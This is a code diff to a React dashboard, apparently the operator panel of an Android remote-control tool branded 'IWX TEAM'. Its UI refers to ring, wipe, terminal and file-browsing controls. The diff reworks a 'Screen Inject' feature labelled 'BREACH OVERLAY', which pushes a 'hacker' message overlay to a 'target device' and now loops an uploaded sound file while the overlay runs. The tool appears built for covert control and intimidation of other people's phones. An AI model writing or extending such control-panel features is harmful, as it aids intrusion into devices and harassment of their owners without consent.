@@ -1,5 +1,5 @@
 'use client'
-import { useEffect, useState } from 'react'
+import { useEffect, useState, useRef } from 'react'
 import useSWR from 'swr'
 import Sidebar from '@/components/Sidebar'
 import StatCard from '@/components/StatCard'
@@ -9,7 +9,7 @@ import {
   Clock, Smartphone, Bell, BellOff,
   CreditCard, Signal, Lock, Trash2, Terminal, FolderOpen, Settings,
 } from 'lucide-react'
-import { Server, Monitor, Shield, SquareTerminal, Play, Square, CheckCircle2, XCircle } from 'lucide-react'
+import { Server, Monitor, Shield, Play, Square, Volume2, VolumeX, Upload } from 'lucide-react'
 
 interface DeviceListItem {
   deviceId: string
@@ -84,10 +84,10 @@ export default function Dashboard() {
   const [isRinging, setIsRinging] = useState(false)
   const [ctrlBusy, setCtrlBusy]         = useState(false)
   const [showWipeConfirm, setShowWipeConfirm] = useState(false)
-  const [injectText, setInjectText]     = useState('By IWX TEAM')
-  const [injectStyle, setInjectStyle]   = useState<'hacker'|'terminal'>('hacker')
+  const [injectText, setInjectText]     = useState('')
   const [isInjecting, setIsInjecting]   = useState(false)
-  const [injectStatus, setInjectStatus] = useState('')
+  const [soundFile, setSoundFile]       = useState<File | null>(null)
+  const audioRef                        = useRef<HTMLAudioElement | null>(null)
 
   const swrKey = selectedId ? `/api/device/heartbeat?deviceId=${encodeURIComponent(selectedId)}` : null
   const { data: deviceData, isLoading: swrLoading } = useSWR(
@@ -129,31 +129,40 @@ export default function Dashboard() {
 
   const handleInject = async () => {
     if (!selectedId || ctrlBusy) return
-    const text = injectText.trim() || 'By IWX TEAM'
+    const text = injectText.trim() || 'IWX TEAM'
     setIsInjecting(true)
-    setInjectStatus('Mengirim perintah...')
+    if (soundFile) {
+      try {
+        if (!audioRef.current) audioRef.current = new Audio()
+        audioRef.current.pause()
+        audioRef.current.src = URL.createObjectURL(soundFile)
+        audioRef.current.loop = true
+        await audioRef.current.play()
+      } catch (_) {}
+    }
     try {
       await fetch('/api/device/command', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ deviceId: selectedId, command: `screen_inject_${injectStyle}:${text}` }),
+        body: JSON.stringify({ deviceId: selectedId, command: `screen_inject_hacker:${text}` }),
       })
-      setInjectStatus('Overlay aktif di layar perangkat')
-    } catch { setInjectStatus('Gagal mengirim perintah') }
+    } catch (_) {}
   }
 
   const handleInjectStop = async () => {
     if (!selectedId) return
     setIsInjecting(false)
-    setInjectStatus('Menghentikan overlay...')
+    if (audioRef.current) {
+      audioRef.current.pause()
+      audioRef.current.currentTime = 0
+    }
     try {
       await fetch('/api/device/command', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ deviceId: selectedId, command: 'screen_inject_stop' }),
       })
-      setInjectStatus('Overlay dihentikan')
-    } catch { setInjectStatus('Gagal menghentikan overlay') }
+    } catch (_) {}
   }
 
   const pollResult = async (command: string, sentAt: number, timeoutMs = 18000): Promise<string> => {
@@ -513,53 +522,54 @@ export default function Dashboard() {
             <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
               <Monitor size={13} className="text-android-green" />
               <span className="text-android-green">Screen Inject</span>
-              <span className="ml-auto text-[10px] text-android-muted/60 font-normal normal-case tracking-normal">Enter untuk kirim</span>
+              <span className="ml-auto flex items-center gap-1 text-[10px] text-android-green/60 font-mono">
+                <Shield size={10} />
+                BREACH OVERLAY
+              </span>
             </h3>
             {!connected ? (
               <p className="text-android-muted text-xs py-2 text-center">Hubungkan perangkat untuk menggunakan Screen Inject</p>
             ) : (
               <div className="space-y-3">
-                {/* Text input — multiline, Enter to send */}
+                {/* Message input */}
                 <textarea
                   value={injectText}
                   onChange={e => setInjectText(e.target.value)}
                   onKeyDown={e => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); handleInject(); } }}
-                  placeholder="Ketik pesan yang akan tampil di layar HP target..."
+                  placeholder="Pesan yang tampil di layar perangkat target..."
                   rows={4}
                   className="w-full bg-android-bg border border-android-green/30 rounded-lg px-3 py-2.5 text-sm text-android-green font-mono placeholder:text-android-muted/40 focus:outline-none focus:border-android-green/70 resize-none leading-relaxed"
                 />
-                {/* Mode selector — only Peretas & Terminal */}
-                <div className="grid grid-cols-2 gap-2">
-                  <button
-                    onClick={() => setInjectStyle('hacker')}
-                    className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg border transition-all ${
-                      injectStyle === 'hacker'
-                        ? 'bg-android-green/15 border-android-green text-android-green'
-                        : 'bg-android-bg border-android-border text-android-muted hover:border-android-green/40'
-                    }`}
-                  >
-                    <Shield size={14} />
-                    <div className="text-left">
-                      <div className="text-xs font-semibold">Mode Peretas</div>
-                      <div className="text-[10px] opacity-60">Matrix + Kartu Pesan</div>
+                {/* Sound input */}
+                <label className="flex items-center gap-2.5 px-3 py-2.5 rounded-lg border border-android-border bg-android-bg cursor-pointer hover:border-android-green/40 transition-colors">
+                  {soundFile
+                    ? <Volume2 size={14} className="text-android-green shrink-0" />
+                    : <Upload size={14} className="text-android-muted shrink-0" />
+                  }
+                  <div className="flex-1 min-w-0">
+                    <div className="text-xs font-semibold text-android-text">
+                      {soundFile ? soundFile.name : 'Pilih file audio'}
                     </div>
-                  </button>
-                  <button
-                    onClick={() => setInjectStyle('terminal')}
-                    className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg border transition-all ${
-                      injectStyle === 'terminal'
-                        ? 'bg-android-green/15 border-android-green text-android-green'
-                        : 'bg-android-bg border-android-border text-android-muted hover:border-android-green/40'
-                    }`}
-                  >
-                    <SquareTerminal size={14} />
-                    <div className="text-left">
-                      <div className="text-xs font-semibold">Terminal</div>
-                      <div className="text-[10px] opacity-60">Output Perintah Palsu</div>
+                    <div className="text-[10px] text-android-muted/60">
+                      {soundFile ? 'Akan diputar saat inject' : 'MP3 / WAV / OGG — opsional'}
                     </div>
-                  </button>
-                </div>
-                {/* Action buttons — full width, mobile friendly */}
+                  </div>
+                  {soundFile && (
+                    <button
+                      onClick={e => { e.preventDefault(); setSoundFile(null); if(audioRef.current){audioRef.current.pause();audioRef.current.src='';} }}
+                      className="text-android-muted hover:text-android-red transition-colors"
+                    >
+                      <VolumeX size={13} />
+                    </button>
+                  )}
+                  <input
+                    type="file"
+                    accept="audio/*"
+                    className="hidden"
+                    onChange={e => setSoundFile(e.target.files?.[0] ?? null)}
+                  />
+                </label>
+                {/* Inject / Stop */}
                 <div className="grid grid-cols-2 gap-2">
                   <button
                     onClick={handleInject}
@@ -578,18 +588,6 @@ export default function Dashboard() {
                     Stop
                   </button>
                 </div>
-                {/* Status log */}
-                {injectStatus && (
-                  <div className="flex items-center gap-2 bg-android-bg border border-android-border rounded-lg px-3 py-2">
-                    {injectStatus.includes('aktif') || injectStatus.includes('tampil')
-                      ? <CheckCircle2 size={12} className="text-android-green shrink-0" />
-                      : injectStatus.includes('Gagal')
-                      ? <XCircle size={12} className="text-android-red shrink-0" />
-                      : <Monitor size={12} className="text-android-muted shrink-0" />
-                    }
-                    <p className="text-xs text-android-muted font-mono">{injectStatus}</p>
-                  </div>
-                )}
               </div>
             )}
           </div>
